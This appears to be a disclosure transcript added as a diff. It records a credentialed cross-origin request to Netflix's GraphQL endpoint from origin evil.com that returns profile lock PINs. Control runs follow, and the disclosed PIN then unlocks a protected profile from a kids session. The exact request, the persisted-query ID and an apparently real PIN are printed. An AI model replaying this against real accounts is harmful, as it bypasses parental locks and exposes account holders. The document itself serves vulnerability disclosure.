@@ -1,0 +1,54 @@
+Field transcript, 2026-10-23. GUIDs truncated to 8 characters; profile names are the
+roles they play on the account. Lines are quoted from the terminal output of the runs;
+anything not observed at the time is marked as trimmed rather than reconstructed.
+The same cookie file (a kids-profile session) was used for all three gate runs.
+
+== read: one request, no enumeration ==========================================
+
+POST https://www.netflix.com/graphql
+origin: https://evil.com
+content-type: application/json
+
+{"operationName":"ProfileLockTemplate","variables":{},
+ "extensions":{"persistedQuery":{"id":"d821963d-5bb5-43c7-a2d1-2cf7eab9f44e","version":102}}}
+
+HTTP 200
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+server: envoy
+
+body: 5 profiles, 1 populated lockPin ("0978"), 4 null
+      (trimmed copy in response.redacted.json)
+
+== control 1: same request, no session cookie ================================
+
+error: UNAUTHENTICATED   (origin: consumeridentitydgs)
+growthAccount: null
+
+== control 2: locked tile, no PIN submitted ==================================
+
+[kids] start pg=NIADRLI3
+[kids] PIN prompt visible: True
+[kids] final pg=NIADRLI3
+[kids] RESULT: BLOCKED
+
+== control 3: locked tile, wrong PIN =========================================
+
+[kids] start pg=NIADRLI3
+[kids] PIN prompt visible: True
+[kids] final pg=NIADRLI3
+[kids] RESULT: BLOCKED
+
+== the disclosed PIN, same session, same target ==============================
+
+[start] pg=NIADRLI3
+[gate ] PIN prompt visible: True
+[final] pg=OTSWWYH4
+RESULT: UNLOCKED            (landing: /browse as the protected profile)
+
+== write path, for completeness ==============================================
+
+growthSetProfilePin / growthRemoveProfilePin
+errors: Access is denied for passport   (origin: passport)
+
+The lock is enforced at the gate and the write path is gated. Only the read is not.
